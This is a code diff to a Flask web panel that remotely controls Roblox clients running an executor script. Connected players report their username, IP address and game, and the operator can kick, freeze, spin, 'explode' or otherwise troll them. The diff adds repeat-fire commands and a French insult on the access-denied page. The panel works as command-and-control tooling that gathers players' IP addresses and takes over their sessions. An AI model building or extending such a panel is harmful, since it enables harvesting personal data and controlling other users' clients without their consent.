@@ -31,6 +31,7 @@ def access_denied(e):
     <html>
       <body style="background:#000;color:#ff3366;font-family:Arial;text-align:center;padding-top:15%;">
         <h1>Accès refusé</h1>
+        <p>Ta crue quoi fdp ?</p>
         <p>Ton IP : <b>{detected}</b></p>
       </body>
     </html>
@@ -41,8 +42,9 @@ def protect_routes():
     if request.path in ["/", "/kick", "/troll"]:
         check_ip()
 
-# === HTML complet du panel ===
-HTML = """<!DOCTYPE html>
+# === HTML du panel ===
+HTML = """
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -131,6 +133,15 @@ function sendTroll(id, cmd) {
     toast(`${cmd.toUpperCase()} sent`, "danger");
 }
 
+function holdCommand(btn, id, cmd) {
+    let interval = null;
+    const start = () => { sendTroll(id, cmd); interval = setInterval(() => sendTroll(id, cmd), 300); };
+    const stop = () => clearInterval(interval);
+    btn.addEventListener("mousedown", start);
+    btn.addEventListener("mouseup", stop);
+    btn.addEventListener("mouseleave", stop);
+}
+
 function render(data) {
     document.getElementById("stats").innerHTML = `Players online: <b>${data.online}</b> / ${data.total}`;
     const grid = document.getElementById("players");
@@ -145,28 +156,30 @@ function render(data) {
             <div class="info">
                 Executor: ${p.executor}<br>
                 IP: ${p.ip}<br>
-                Game: <a href="https://www.roblox.com/games/${p.gameId}?jobId=${p.jobId}" target="_blank">${p.game || "Unknown"}</a><br>
+                Game: <button class="kick-btn" style="background:#666;" onclick="window.open('https://www.roblox.com/fr/games/${p.gameId}', '_blank')">${p.game || 'Unknown'}</button><br>
                 JobId: ${p.jobId || "Unknown"}
             </div>
             <div class="category">TROLLS</div>
             <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                 <button class="kick-btn" style="background:linear-gradient(45deg,#ff3366,#ff5588);" onclick="openKickModal('${id}')">KICK</button>
-                <button class="kick-btn" style="background:linear-gradient(45deg,#00ffaa,#00cc88);" onclick="sendTroll('${id}','walk')">WALK</button>
+                <button class="kick-btn" id="walkBtn_${id}" style="background:linear-gradient(45deg,#00ffaa,#00cc88);">WALK</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#ff00ff,#aa00aa);" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#00ffff,#00aaaa);" onclick="sendTroll('${id}','spin')">SPIN</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#ffff00,#aaaa00);" onclick="sendTroll('${id}','jump')">JUMP</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#88ff88,#55aa55);" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#ff5555,#aa0000);" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#5555ff,#0000aa);" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
-                <button class="kick-btn" style="background:linear-gradient(45deg,#00ff88,#00aa55);" onclick="sendTroll('${id}','uninvisible')">UNINVISIBLE</button>
             </div>
             <div class="category">UNDO</div>
             <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                 <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                 <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                 <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unrainbow')">STOP RAINBOW</button>
+                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','uninvisible')">UNINVISIBLE</button>
             </div>
         `;
+        const walkBtn = document.getElementById(`walkBtn_${id}`);
+        holdCommand(walkBtn, id, 'walk');
     });
     
     document.querySelectorAll('.card').forEach(c => {
@@ -183,15 +196,14 @@ socket.on("kick_notice", d => toast(`${d.username} → ${d.reason}`, "danger"));
 socket.on("status", d => toast(`${d.username} is now ${d.online ? "online" : "offline"}`));
 </script>
 </body>
-</html>"""
-
-# === Routes API et Flask ===
+</html>
+"""
 
 @app.route("/")
 def index():
     return render_template_string(HTML)
 
-@app.route("/api", methods=["GET","POST"])
+@app.route("/api", methods=["GET", "POST"])
 def api():
     now = time.time()
     if request.method == "POST":
@@ -200,14 +212,14 @@ def api():
             uid = str(d["userid"])
             if d.get("action") == "register":
                 connected_players[uid] = {
-                    "username": d.get("username","Unknown"),
-                    "executor": d.get("executor","Unknown"),
-                    "ip": d.get("ip","Unknown"),
+                    "username": d.get("username", "Unknown"),
+                    "executor": d.get("executor", "Unknown"),
+                    "ip": d.get("ip", "Unknown"),
                     "last": now,
                     "online": True,
-                    "game": d.get("game","Unknown"),
-                    "jobId": d.get("jobId","Unknown"),
-                    "gameId": d.get("placeId","Unknown")
+                    "game": d.get("game", "Unknown"),
+                    "gameId": d.get("gameId", d.get("placeId", "0")),
+                    "jobId": d.get("jobId", "Unknown")
                 }
                 socketio.emit("status", {"username": connected_players[uid]["username"], "online": True})
             elif d.get("action") == "heartbeat" and uid in connected_players:
@@ -215,56 +227,57 @@ def api():
         except: pass
         return jsonify({"ok": True})
 
-    uid = str(request.args.get("userid",""))
-    if not uid: return jsonify({})
-    if uid in pending_kicks:
-        reason = pending_kicks.pop(uid,"Kicked")
-        return jsonify({"command":"kick","reason":reason})
-    if uid in pending_commands:
-        cmd = pending_commands.pop(uid)
-        return jsonify({"command":cmd})
-    return jsonify({})
+    if request.method == "GET":
+        uid = str(request.args.get("userid", ""))
+        if not uid: return jsonify({})
+        if uid in pending_kicks:
+            reason = pending_kicks.pop(uid, "Kicked")
+            return jsonify({"command": "kick", "reason": reason})
+        if uid in pending_commands:
+            cmd = pending_commands.pop(uid)
+            return jsonify({"command": cmd})
+        return jsonify({})
 
 @app.route("/kick", methods=["POST"])
 def kick():
     check_ip()
     data = request.get_json() or {}
-    uid = str(data.get("userid",""))
-    reason = data.get("reason","No reason")
+    uid = str(data.get("userid", ""))
+    reason = data.get("reason", "No reason")
     pending_kicks[uid] = reason
-    name = connected_players.get(uid,{}).get("username","Unknown")
+    name = connected_players.get(uid, {}).get("username", "Unknown")
     socketio.emit("kick_notice", {"username": name, "reason": f"KICK: {reason}"})
-    return jsonify({"sent":True})
+    return jsonify({"sent": True})
 
 @app.route("/troll", methods=["POST"])
 def troll():
     check_ip()
     data = request.get_json() or {}
-    uid = str(data.get("userid",""))
-    cmd = data.get("cmd","")
+    uid = str(data.get("userid", ""))
+    cmd = data.get("cmd", "")
     if uid and cmd:
         pending_commands[uid] = cmd
-        name = connected_players.get(uid,{}).get("username","Unknown")
+        name = connected_players.get(uid, {}).get("username", "Unknown")
         socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
-    return jsonify({"sent":True})
+    return jsonify({"sent": True})
 
 def broadcast_loop():
     while True:
         now = time.time()
         online = 0
         to_remove = []
-        for uid,p in connected_players.items():
+        for uid, p in connected_players.items():
             if now - p["last"] > 30:
                 to_remove.append(uid)
             else:
                 p["online"] = now - p["last"] < 15
-                if p["online"]: online+=1
+                if p["online"]: online += 1
         for uid in to_remove:
-            username = connected_players.pop(uid,{}).get("username","Unknown")
-            socketio.emit("status",{"username":username,"online":False})
-        socketio.emit("update",{"players":connected_players,"online":online,"total":len(connected_players)})
+            username = connected_players.pop(uid, {}).get("username", "Unknown")
+            socketio.emit("status", {"username": username, "online": False})
+        socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
         socketio.sleep(2)
 
-if __name__=="__main__":
+if __name__ == "__main__":
     socketio.start_background_task(broadcast_loop)
     socketio.run(app, host="0.0.0.0", port=5000)
